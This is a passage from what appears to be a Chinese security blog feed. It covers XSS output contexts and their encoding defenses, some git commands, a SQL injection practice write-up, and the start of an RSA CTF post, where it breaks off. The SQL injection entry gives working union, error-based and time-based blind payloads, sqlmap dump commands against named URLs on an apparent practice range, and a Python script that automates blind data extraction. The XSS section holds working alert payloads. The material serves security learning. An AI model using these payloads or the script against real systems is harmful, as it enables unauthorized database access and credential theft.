<h2 id="在-HTML-标签中输出"><a href="#在-HTML-标签中输出" class="headerlink" title="在 HTML 标签中输出"></a>在 <code>HTML</code> 标签中输出</h2><p>在 <code>HTML</code> 标签中直接输出变量，没有做任何处理，会导致 <code>XSS</code>。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span></span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这种方式的解决方案是，所有需要输出到页面的元素全部通过 <code>HTMLEncode</code>。</p>
<h2 id="在-HTML-属性中输出"><a href="#在-HTML-属性中输出" class="headerlink" title="在 HTML 属性中输出"></a>在 <code>HTML</code> 属性中输出</h2><p>在和 <code>HTML</code> 标签中输出攻击方式类似，只不过输出的内容会自动闭合标签。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>$var<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token punctuation">></span></span>$var<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- ">&lt;img src=# onerror=alert(1)>&lt;" --></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这种方式的防御方法仍然是 <code>HTMLEncode</code> 。</p>
<h2 id="在-lt-script-gt-标签中输出"><a href="#在-lt-script-gt-标签中输出" class="headerlink" title="在 &lt;script&gt; 标签中输出"></a>在 <code>&lt;script&gt;</code> 标签中输出</h2><p>假设我们的变量都在引号内部：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token string">"$var"</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>

<span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string">""</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>攻击者只需要闭合标签就能实行攻击，目前的防御方法为 <code>JavaScriptEncode</code>。</p>
<h2 id="在-CSS-中输出"><a href="#在-CSS-中输出" class="headerlink" title="在 CSS 中输出"></a>在 <code>CSS</code> 中输出</h2><p>在 <code>CSS</code> 中或者 <code>style</code> 标签或者 <code>style attribute</code> 中形成的攻击花样非常多，总体上类似于下面几个例子：</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">&lt;style><span class="token atrule"><span class="token rule">@import</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">'http:xxxxx'</span><span class="token punctuation">)</span></span>&lt;/style>
&lt;style>@import <span class="token string">'http:xxxxx'</span>&lt;/style>
&lt;style>li</span> <span class="token punctuation">&#123;</span><span class="token property">list-style-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">'xxxxxx'</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">&lt;/style>
&lt;style>body</span> <span class="token punctuation">&#123;</span><span class="token property">binding</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">'xxxxxxxxxx'</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span>&lt;/style>
&lt;div style=<span class="token string">'background-image: url(xxxx)'</span>>&lt;/div>
&lt;div style=<span class="token string">'width: expression(xxxxx)'</span>>&lt;/div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>要解决 <code>CSS</code> 的攻击问题，一方面要严格控制用户将变量输入<code>style</code> 标签内，另一方面不要引用未知的 <code>CSS</code> 文件，如果一定有用户改变 <code>CSS</code> 变量这种需求的话，可以使用 <code>OWASP ESAPI</code> 中的 <code>encodeForCSS()</code> 函数。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> safe <span class="token operator">=</span> ESAPI<span class="token punctuation">.</span><span class="token function">encoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeForCSS</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="在-URL-中输出"><a href="#在-URL-中输出" class="headerlink" title="在 URL 中输出"></a>在 <code>URL</code> 中输出</h2><p>在地址张输出也比较复杂。一般来说 <code>URL</code> 的 <code>path</code> 或者 <code>search</code> 中进行攻击直接使用 <code>URLEncode</code> 即可。<code>URLEncode</code> 会将字符串转换为 <code>%HH</code> 的形式，类似空格就是 <code>%20</code>。</p>
<p>可能的攻击方法就是：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 原始 URL --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost/?test=$var<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- 攻击 URL --></span>
&lt;a href="http://localhost/?test=" onclick=alert(1)"">test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- URLEncode --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost/?test=%22%20onclick%3balert%281%29%22<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果整个 <code>URL</code> 被用户控制，这时url的Protocal和Host是不能被URLEncode转义的。</p>
<p>一个 <code>URL</code> 的组成如下：</p>
<pre class="line-numbers language-none"><code class="language-none">[Protocal][Host][Path][Search][Hash]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>例如：</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.evil.com&#x2F;a&#x2F;b&#x2F;c&#x2F;test?abc&#x3D;123#ssss
[Protocal] 对应 https:&#x2F;&#x2F;
[Host] 对应 www.evil.com
[Path] 对应 &#x2F;a&#x2F;b&#x2F;c&#x2F;test
[Search] 对应 ?abc&#x3D;123
[Hash] 对应 #ssss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一般来说，如果变量是整个 <code>URL</code> ，则应该先检查变量是否以 <code>http</code> 开头，在此之后再对里面的变量进行 <code>URLEncode</code> 。</p>
<h2 id="富文本处理"><a href="#富文本处理" class="headerlink" title="富文本处理"></a>富文本处理</h2><p>在一些网站，网站允许用户富含 <code>HTML</code> 标签的代码，比如文本里面要有图片、视频之类，这些文本展现出来全都是依靠 <code>HTML</code> 代码来实现。</p>
<p>那么，我们需要如何区分安全的 <code>富文本</code> 和 <code>XSS</code> 攻击呢？</p>
<p>基本的思想就是：</p>
<ol>
<li>首先进行输入检查，保证用户输入的是完整的 <code>HTML</code> 代码，而不是有拼接的代码</li>
<li>通过 <code>htmlParser</code> 解析出 <code>HTML</code> 代码的标签、属性、事件</li>
<li><code>富文本</code> 的 <code>事件</code> 肯定要被禁止，因为<code>富文本</code> 并不需要 <code>事件</code> 这种东西，另外一些危险的标签也需要禁止，例如： <code>&lt;iframe&gt;</code>，<code>&lt;script&gt;</code>，<code>&lt;base&gt;</code>，<code>&lt;form&gt;</code> 等</li>
<li>利用白名单机制，只允许安全的标签嵌入，例如：<code>&lt;a&gt;</code>，<code>&lt;img&gt;</code>，<code>div</code>等，白名单不仅仅适用于标签，也适用于<code>属性</code></li>
<li>过滤用户 <code>CSS</code> ，检查是否有危险代码</li>
</ol>
<blockquote>
<p><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB">XSS攻击 百度百科</a></p>
<p><a href="https://tech.meituan.com/2018/09/27/fe-security.html">如何防止XSS攻击</a></p>
<p><a href="https://sking7.github.io/articles/430468050.html">防御XSS的七条原则</a></p>
<p><a href="https://juejin.cn/post/6844903684900388871">XSS的防御</a></p>
<p>《白帽子讲web安全》</p>
</blockquote>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>security</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>git常用命令</title>
    <url>/2021/06/22/git-chang-yong-ming-ling/</url>
    <content><![CDATA[<p>转自：</p>
<blockquote>
<p><a href="https://blog.csdn.net/zl1zl2zl3/article/details/94019526">git merge最简洁用法</a></p>
<p><a href="https://www.jianshu.com/p/cc740394faf5">git修改分支名称</a></p>
</blockquote>
<span id="more"></span>
<h1 id="merge用法"><a href="#merge用法" class="headerlink" title="merge用法"></a>merge用法</h1><h2 id="一、开发分支（dev）上的代码达到上线的标准后，要合并到-master-分支"><a href="#一、开发分支（dev）上的代码达到上线的标准后，要合并到-master-分支" class="headerlink" title="一、开发分支（dev）上的代码达到上线的标准后，要合并到 master 分支"></a>一、开发分支（dev）上的代码达到上线的标准后，要合并到 master 分支</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git checkout dev
git pull
git checkout master
git merge dev
git push -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二、当master代码改动了，需要更新开发分支（dev）上的代码"><a href="#二、当master代码改动了，需要更新开发分支（dev）上的代码" class="headerlink" title="二、当master代码改动了，需要更新开发分支（dev）上的代码"></a>二、当master代码改动了，需要更新开发分支（dev）上的代码</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git checkout master 
git pull 
git checkout dev
git merge master 
git push -u origin dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="git修改分支名称"><a href="#git修改分支名称" class="headerlink" title="git修改分支名称"></a>git修改分支名称</h1><p>假设分支名称为oldName<br>想要修改为 newName</p>
<h2 id="本地分支重命名-还没有推送到远程"><a href="#本地分支重命名-还没有推送到远程" class="headerlink" title="本地分支重命名(还没有推送到远程)"></a>本地分支重命名(还没有推送到远程)</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git branch -m oldName newName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="远程分支重命名"><a href="#远程分支重命名" class="headerlink" title="远程分支重命名"></a>远程分支重命名</h2><p> <strong>已经推送远程-假设本地分支和远程对应分支名称相同</strong></p>
<ol>
<li>重命名远程分支对应的本地分支</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git branch -m oldName newName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li>删除远程分支</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git push --delete origin oldName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li>上传新命名的本地分支</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git push origin newName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li>把修改后的本地分支与远程分支关联</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git branch --set-upstream-to origin&#x2F;newName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      <categories>
        <category>命令</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入实战</title>
    <url>/2021/06/21/sql-zhu-ru-shi-zhan/</url>
    <content><![CDATA[<p>ε=(´ο｀*)))唉，太菜了</p>
<p>sql注入都忘完了</p>
<span id="more"></span>
<h1 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h1><p><a href="https://rimovni.exeye.run/hugkudure/well">https://rimovni.exeye.run/hugkudure/well</a></p>
<pre class="line-numbers language-none"><code class="language-none">1.判断注入
name&#x3D;1&#39; or 1#

2.判断字段
name&#x3D;1&#39; order by 5#
name&#x3D;1&#39; order by 6#

3.union查询
name&#x3D;-1&#39; union select 1,2,3,4,5#

4.查询数据库、表名
name&#x3D;-1&#39; union select 1,database(),user(),version(),table_name from information_schema.tables where table_schema&#x3D;&#39;twosecu1_vuln_06&#39; limit 0,1#

5.查询列
name&#x3D;-1&#39; union select 1,database(),user(),version(),column_name from information_schema.columns where table_schema&#x3D;&#39;twosecu1_vuln_06&#39; and table_name&#x3D;&#39;flag&#39; limit 1,1#

6.查字段
name&#x3D;-1&#39; union select 1,database(),user(),version(),flag from flag limit 0,2#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a href="https://rimovni.exeye.run/mefe/login">https://rimovni.exeye.run/mefe/login</a></p>
<pre class="line-numbers language-none"><code class="language-none">1.前段验证邮箱
email&#x3D;1@1.com
passwoed&#x3D;1

2.post提交，判断注入
email&#x3D;1&#39; or 1#&amp;password&#x3D;1

3.判断字段
email&#x3D;1&#39; order by 3#&amp;password&#x3D;1
email&#x3D;1&#39; order by 4#&amp;password&#x3D;1

4.报错注入
email&#x3D;1&#39;&amp;password&#x3D;1

5.爆出数据库
email&#x3D;1&#39; and updatexml(1,concat(0x7e,database(),0x7e,user()),1)#&amp;password&#x3D;1
email&#x3D;1&#39; and extractvalue(1,concat(0x7e,user(),0x7e,database()))#&amp;password&#x3D;1
email&#x3D;1&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x7e,database(),0x7e,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#&amp;password&#x3D;1

6.爆当前数据库表
email&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)#&amp;password&#x3D;1
email&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))#&amp;password&#x3D;1
email&#x3D;1&#39; union select 1,2,3 from (select count(*),concat((select concat(table_name,0x7e)from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#&amp;password&#x3D;1

7.爆字段
email&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;twosecu1_vuln_08&#39; and table_name&#x3D;&#39;user&#39;),0x7e),1)#&amp;password&#x3D;1
email&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;twosecu1_vuln_08&#39; and table_name&#x3D;&#39;user&#39;),0x7e))#&amp;password&#x3D;1
email&#x3D;1&#39; union select 1,2,3 from (select count(*),concat((select concat(column_name,0x7e)from information_schema.columns where table_schema&#x3D;&#39;twosecu1_vuln_08&#39; and table_name&#x3D;&#39;user&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#&amp;password&#x3D;1

8.爆数据库内容
email&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from twosecu1_vuln_08.user)),1)#&amp;password&#x3D;1
email&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from twosecu1_vuln_08.user)))#&amp;password&#x3D;1
email&#x3D;1&#39; union select 1,2,3 from (select count(*),concat((select concat(password,0x7e) from twosecu1_vuln_08.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="sql语句注入"><a href="#sql语句注入" class="headerlink" title="sql语句注入"></a>sql语句注入</h1><p><a href="https://rimovni.exeye.run/rodka/index">https://rimovni.exeye.run/rodka/index</a></p>
<pre class="line-numbers language-none"><code class="language-none">1.爆数据库
select length(database());
select substr(database(),1,16);

2.表总数
select count(table_name) from information_schema.tables where table_schema&#x3D;database();

3.爆数据库表
select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1;
select table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1;

4.爆字段
select count(column_name) from information_schema.columns where table_name&#x3D;&#39;search&#39;;
select column_name from information_schema.columns where table_name&#x3D;&#39;search&#39; limit 0,1;

5.爆内容
select concat(one,&quot;---&quot;,two,&quot;---&quot;,three,&quot;---&quot;,four,&quot;---&quot;,five) from search limit 0,1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="union注入-1"><a href="#union注入-1" class="headerlink" title="union注入"></a>union注入</h1><p><a href="https://rimovni.exeye.run/matihe/index?name=one">https://rimovni.exeye.run/matihe/index?name=one</a></p>
<pre class="line-numbers language-none"><code class="language-none">python .\sqlmap.py -u https:&#x2F;&#x2F;rimovni.exeye.run&#x2F;matihe&#x2F;index?name&#x3D;one --dbs
python .\sqlmap.py -u https:&#x2F;&#x2F;rimovni.exeye.run&#x2F;matihe&#x2F;index?name&#x3D;one -D &#39;twosecu1_vuln_04&#39; --tables
python .\sqlmap.py -u https:&#x2F;&#x2F;rimovni.exeye.run&#x2F;matihe&#x2F;index?name&#x3D;one -D &#39;twosecu1_vuln_04&#39; -T &#39;workbook&#39; --columns
python .\sqlmap.py -u https:&#x2F;&#x2F;rimovni.exeye.run&#x2F;matihe&#x2F;index?name&#x3D;one -D &#39;twosecu1_vuln_04&#39; -T &#39;workbook&#39; -C &#39;name&#39; --dump
无法爆出数据，可能是过滤了字符“two”
借助sqlmap手动payload
?name&#x3D;-1&#39; union select 1,user(),3,database()-- -
?name&#x3D;-1&#39; union select 1,user(),3,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1-- -
?name&#x3D;-1&#39; union select 1,user(),3,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;workbook&#39; limit 0,1-- -
?name&#x3D;-1&#39; union select 1,user(),3,node from workbook limit 5,1-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p><a href="https://rimovni.exeye.run/fe/login">https://rimovni.exeye.run/fe/login</a></p>
<p>本来是没有发现是什么注入的，然后用Acunetix扫了一下，发现它给出的payload可以执行，默认好像都是用的sleep函数来进行测试的，然后猜测这个页面为时间盲注，但是怎么构造也不能执行sleep，于是借用Acunetix的payload进行注入</p>
<p><code>/*&#39;+(select(0)from(select(sleep(5)))v)+&#39;*/</code></p>
<p>最后爆出数据库 <code>twosecu1_vuln_07</code> ，数据表 <code>word,use</code> ，字段（两张表一样） <code>id,username,password</code> ，以及数据（word只有一行数据，user好像是无数据） <code>,test,test</code></p>
<pre class="line-numbers language-none"><code class="language-none">1.爆数据库
username&#x3D;&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((length(database())&#x3D;16),5,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
username&#x3D;&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((ORD(mid(database(),1,1))&#x3D;116),5,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
twosecu1_vuln_07

2.爆数据库表
username&#x3D;&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if(((select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;twosecu1_vuln_07&#39;)&#x3D;2),15,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
username&#x3D;&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&#x3D;9),15,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
username&#x3D;\&quot; *&#39;+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),%d,1))&#x3D;%d),15,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
word,user

3.爆字段
uname &#x3D; &quot;\&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;user&#39;)),%d,1))&#x3D;%d),15,0))))v)+&#39;*&#x2F;&quot;&amp;password&#x3D;1
id,username,password

4.报数据
uname &#x3D; &quot;\&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(id) from twosecu1_vuln_07.word)),%d,1))&#x3D;%d),15,0))))v)+&#39;*&#x2F;&quot; %(i,j)
1,test,test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>爆数据库</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>_username<span class="token punctuation">,</span> _password<span class="token punctuation">)</span><span class="token punctuation">:</span>
	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token string">'username'</span><span class="token punctuation">:</span>_username<span class="token punctuation">,</span>
		<span class="token string">'password'</span><span class="token punctuation">:</span>_password
	<span class="token punctuation">&#125;</span>
	url <span class="token operator">=</span> <span class="token string">"https://rimovni.exeye.run/fe/login"</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] %s"</span> <span class="token operator">%</span>url<span class="token punctuation">)</span>
	stime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
	etime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
	tt <span class="token operator">=</span> etime <span class="token operator">-</span> stime
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Time: %f"</span> <span class="token operator">%</span>tt<span class="token punctuation">)</span>
	<span class="token keyword">if</span> tt <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> <span class="token boolean">True</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	s <span class="token operator">=</span> <span class="token string">""</span>
	passwd <span class="token operator">=</span> <span class="token string">"1"</span>
	s_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token comment"># ss = "_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span>
	ss <span class="token operator">=</span> <span class="token string">"_0123456789abcdefghijklmnopqrstuvwxyz"</span>
	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># for j in range(33, 127):</span>
		<span class="token keyword">for</span> j <span class="token keyword">in</span> ss<span class="token punctuation">:</span>
			uname <span class="token operator">=</span> <span class="token string">"\" /*'+(select(1)from(select(sleep(if((ORD(mid(database(),%d,1))=%d),10,0))))v)+'*/"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token comment"># print(uname)</span>
			b <span class="token operator">=</span> login<span class="token punctuation">(</span>uname<span class="token punctuation">,</span>passwd<span class="token punctuation">)</span>
			<span class="token keyword">if</span> b<span class="token punctuation">:</span>
				s <span class="token operator">+=</span> j
				<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Brup:"</span> <span class="token operator">+</span> s<span class="token punctuation">)</span>
				<span class="token keyword">break</span>
	e_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Total Time: %f"</span> <span class="token operator">%</span><span class="token punctuation">(</span>e_time <span class="token operator">-</span> s_time<span class="token punctuation">)</span><span class="token punctuation">)</span>

main<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># twosecu1_vuln_07</span>

<span class="token comment"># table</span>
<span class="token comment"># uname = "\" /*'+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))=%d),15,0))))v)+'*/" %(i,ord(j))</span>

<span class="token comment"># column</span>
<span class="token comment"># uname = "\" /*'+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='word')),%d,1))=%d),15,0))))v)+'*/" %(i,ord(j))</span>

<span class="token comment"># data</span>
<span class="token comment"># uname = "\" /*'+(select(1)from(select(sleep(if((ORD(mid(((select username from twosecu1_vuln_07.word limit 0,1)),%d,1))=%d),15,0))))v)+'*/" %(i,j)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sqli</tag>
        <tag>attack</tag>
      </tags>
  </entry>
  <entry>
    <title>几道RSA基础题</title>
    <url>/2020/05/30/ji-dao-rsa-ji-chu-ti/</url>
    <content><![CDATA[<p>记录几道RSA入门题</p>
<span id="more"></span>
<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><blockquote>
<p>题目：在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17<br>求解出d作为flga提交</p>
</blockquote>
<p>基础题，直接解<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
p<span class="token operator">=</span><span class="token number">473398607161</span>
q<span class="token operator">=</span><span class="token number">4511491</span>
